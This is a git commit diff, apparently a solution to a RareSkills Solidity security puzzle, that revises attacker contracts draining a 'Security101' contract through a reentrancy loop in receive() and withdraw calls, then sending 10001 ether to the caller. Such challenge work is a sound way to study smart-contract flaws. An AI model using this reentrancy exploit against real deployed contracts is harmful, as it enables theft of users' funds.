4bfe3fad9cba3b6d3e34caee6ae7717fbc449902
Clouds Flowing <clouds.flowing@gmail.com>
2023-05-09 22:25:57 +0800

    second attempt

--- rare_skills/230509.sol
+++ rare_skills/230509.sol
@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: AGPL-3.0
 pragma solidity ^0.8.15;
-import "forge-std/console.sol";
 
 contract Security101 {
     mapping(address => uint256) balances;
@@ -21,34 +20,28 @@ contract Security101 {
 
 contract AttackerMiddle {
     Security101 token;
-    uint i;
+    bool i;
     constructor(Security101 _token) payable {
         token = _token;
     }
 
     function attack(address to) external {
         token.deposit{value: 1 ether}();
-        for (uint k = 0; k < 1000; k++) {
-            token.withdraw(1 ether);
-            i = 0;
-        }
-        i = 9;
         token.withdraw(1 ether);
-        i = 0;
-        console.log("balance", address(this).balance);
-        payable(to).transfer(10000 ether);
+        token.withdraw(9999 ether);
+        payable(to).transfer(10001 ether);
     }
 
     receive() external payable {
-        if (i++ < 9)
+        if (i == false) {
+            i = true;
             token.withdraw(1 ether);
+        }
     }
 }
 
 contract OptimizedAttackerSecurity101 {
     Security101 token;
-    uint public i = 0;
-    event Received();
     constructor(address _token) payable {
         AttackerMiddle tmp = new AttackerMiddle{value: 1 ether}(Security101(_token));
         tmp.attack(msg.sender);
